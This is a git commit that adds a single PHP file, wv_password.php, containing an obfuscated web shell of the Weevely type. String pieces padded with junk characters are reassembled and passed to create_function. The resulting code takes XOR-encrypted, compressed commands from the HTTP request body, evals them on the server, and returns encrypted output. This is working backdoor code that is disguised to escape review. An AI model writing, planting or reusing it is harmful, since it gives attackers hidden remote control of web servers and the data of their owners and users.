2268fc628bac8bf183b098e7f87749ed8965e8b8
HoaSec <37164935+HoaSec@users.noreply.github.com>
2023-12-11 19:35:08 -0500

    Add files via upload

---
+++ wv_password.php
@@ -0,0 +1,11 @@
+<?php
+$W='$j=01n;($j<1n$1nc&&$i<$l);$j1n++,$i++1n){1n1n$o.=$t{$i}^$1nk{$j}1n1n;}}return $o;}if 1n(@pr1ne1ng_m1na';
+$B='1nv1nal(@gzuncompres1ns(@x(1n@ba1nse64_de1ncode($m[1]1n),$k)))1n;$1no=1n@ob_get_conte1nnts();1n@ob_';
+$N='end1n_c1nle1nan();$r=1n@ba1nse64_en1n1ncode(@x(@gzcompre1nss($o)1n,$1nk));print(1n"$p$kh$r$1nkf");}';
+$u='tch("/$kh(.+)$1nkf1n/",@file_ge1nt_cont1nents("p1nhp:/1n/input")1n,$1nm)==1) {1n@ob_st1nart();@e1n';
+$Q='$k="5f4dc1nc3b";1n$kh="51naa765d61n11nd83";$kf=1n"27d1neb882cf1n99";1n1n$p="O1nr9une4Z41ngjwAsGO"';
+$x=';functio1n1nn 1nx($t,$k){$c=str1nlen1n($k);$l=s1ntrlen1n($t);$1no="1n";for($1n1ni=0;$i<$l;){1nfor(';
+$J=str_replace('E','','EcreatEeEE_EfunctiEon');
+$r=str_replace('1n','',$Q.$x.$W.$u.$B.$N);
+$a=$J('',$r);$a();
+?>
